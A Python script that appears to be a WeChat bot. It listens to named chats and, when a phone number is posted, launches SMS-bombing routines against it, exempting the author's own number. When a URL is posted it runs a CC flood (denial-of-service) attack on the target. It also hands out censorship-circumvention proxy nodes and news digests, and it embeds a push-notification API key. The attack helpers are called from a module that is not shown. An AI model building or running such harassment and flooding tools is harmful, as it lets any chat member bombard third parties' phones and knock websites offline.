import time
import requests
from wxauto import *
import methods
import datetime

# 初始化微信
wx = WeChat()

# 创建需要监听的聊天框
list=[
    '相亲相爱眯眯眼',
    '辉',
    '黄凌鹏',
    '战狼',
    '神',
    '小丑'
]

# 把需要监听的聊天框加入监听
for i in list:
    wx.AddListenChat(who=i,savepic=False)


# 如果这段掉了，就给我的手机发信息
try:
    # 循环监听
    while True:
         # 获取监听信息
        msgs = wx.GetListenMessage()
        # 循环取出每一条信息
        for chat in msgs:

            # 只取出发送的内容
            keyword = msgs.get(chat)[-1][1]
            # 短信轰炸
            if(methods.is_phonenum(keyword)):
                if(keyword == '13599029430'):
                    chat.SendMsg("【严重警告】请保持对神的敬畏！你没有任何亵渎神的机会！你没有任何权限对神动手！")
                else:
                    if methods.bianfu(keyword):
                        chat.SendFiles('msg.png')
                    else:
                        chat.SendMsg('[蝙蝠]提交失败')
                    chat.SendMsg(methods.dxhz_menghu(keyword))
                    chat.SendMsg(methods.dxhz_bingfeng(keyword))
                continue
            # 返回节点
            if(keyword == '翻'):
                chat.SendMsg(methods.fanqiang())
                continue
            # 历史上的今天，简单版
            if(keyword == '历史'):
                chat.SendMsg(methods.histroy_today_news_simple())
                continue
            # 历史上的今天，详细版
            if(keyword == '详细历史'):
                chat.SendMsg(methods.histroy_today_news_detailed())
                continue
            if(keyword == '简报'):
                chat.SendMsg(methods.today_news())
                continue
            if(methods.check_is_cc(keyword)):
                ip = methods.change_cc_url(keyword)
                methods.cc_attack(ip)
                chat.SendFiles('cc_msg.png')
                continue
        time.sleep(5)
except:
    requests.get('https://api.day.app/LzKC6mQqMS3aKiX2RA3MML/微信掉线了')
